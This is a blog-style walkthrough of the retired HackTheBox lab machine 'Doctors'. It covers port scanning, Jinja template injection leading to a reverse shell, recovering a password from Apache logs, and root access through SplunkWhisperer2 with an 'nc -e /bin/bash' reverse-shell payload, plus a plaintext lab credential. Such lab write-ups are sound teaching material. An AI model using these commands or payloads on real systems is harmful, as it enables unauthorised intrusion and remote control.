---
layout: post
title: HTB Doctors
categories: [HTB, OSCP]
---

HI all. Doctors machine retired today so lets look into it.

![](/images/doctors/logo.jpeg)

We start with simple nmap scan

```bash
nmap -sC -sV -oA nmap/inital 10.10.10.209
# Nmap 7.91 scan initiated Fri Feb  5 23:39:30 2021 as: nmap -sC -sV -oA nmap/inital 10.10.10.209
Nmap scan report for 10.10.10.209
Host is up (0.15s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb  5 23:40:26 2021 -- 1 IP address (1 host up) scanned in 55.97 seconds
```

We have few ports open:
* 22 for SSH
* 80 for Apache webserver
* 8089 for splunkd

Also run full nmap scan but it did not find any extra ports. I quickly look into splunk but all exploits require authentication so I moved to web site on port 80

![](/images/doctors/website.png)

At bottom we can see that there is an email address *info@doctors.htb*. Added this to /etc/hosts and reload page. I was greeting with login and password portal. There was an option for register account so i quickly register. 

![](/images/doctors/register.png)

And i was in doctor secure messaging. Start to get feel for application. Look into my account. I was able to create new message

![](/images/doctors/message.png)

I was getting nowhere so i lunch gobuster to look some interesting points.

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://doctors.htb -t 25 -k | tee gobuster 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://doctors.htb
[+] Threads:        25
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/06 00:20:25 Starting gobuster
===============================================================
/login (Status: 200)
/archive (Status: 200)
/register (Status: 200)
/home (Status: 302)
/account (Status: 302)
/logout (Status: 302)
/reset_password (Status: 200)
/server-status (Status: 403)
```

Archive looks interesting. When I visited this website it was blank. I also look for source of this website to my surprise i was title of my message I created.  

![](/images/doctors/archive-title.png)

I tried to XXE but that did not work very well. THem i tried SSTI with simple bracket trick

![](/images/doctors/jinja.png)

Look into archive again 

![](/images/doctors/jinja-archive.png)

Bingo it give us 25 which mean we have some kind of RCE. I look for reverse shell in payload all the thing and try simple python one. I had to change IP address and commands i want to run

![](/images/doctors/reverse-shell.png)

I visited shell. 

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.209] 49068
id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
/usr/bin/python3.8 -c "import pty;pty.spawn('/bin/bash')"
web@doctor:~$ 
```

I had shell. I also member of adm group. I had to google what that actually mean. Adm group give you access to logs in most cases...

I start looking for logs and found backup in apache2 folder in /var/logs. Run quickly command with grep looking for password and that give me one result back

```bash
web@doctor:~$ cd /var/log
cd /var/log
web@doctor:/var/log$ cd apache2
cd apache2
web@doctor:/var/log/apache2$ ls
ls
access.log        access.log.3.gz  error.log        error.log.3.gz
access.log.1      access.log.4.gz  error.log.1      error.log.4.gz
access.log.10.gz  access.log.5.gz  error.log.10.gz  error.log.5.gz
access.log.11.gz  access.log.6.gz  error.log.11.gz  error.log.6.gz
access.log.12.gz  access.log.7.gz  error.log.12.gz  error.log.7.gz
access.log.13.gz  access.log.8.gz  error.log.13.gz  error.log.8.gz
access.log.14.gz  access.log.9.gz  error.log.14.gz  error.log.9.gz
access.log.2.gz   backup           error.log.2.gz   other_vhosts_access.log
web@doctor:/var/log/apache2$ cat backup | grep password
cat backup | grep password
10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=******" 500 453 "http://doctor.htb/reset_password"
web@doctor:/var/log/apache2$
```

I tried this password as shaun because that only one user here. it worked. As we know splunk forwarded is there on port 8089 and we have creds there is privilege escalation option for us. I downloaded [SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2)

```bash
git clone https://github.com/cnotin/SplunkWhisperer2.git 
cd SplunkWhisperer2/PySplunkWhisperer2 
pip install -r requirements.txt 
```

There is a option to run remote attack and start listener.

```bash
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.24 --username shaun --password Guitar123 --payload "nc.traditional -e /bin/bash 10.10.14.24 9001" --port 8089
```

```bash
nc -nlvp 9001
listening on [any] 9001 ...
id
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.209] 36070
uid=0(root) gid=0(root) groups=0(root)
```

I got reverse shell as admin user. Thanks for reading. 







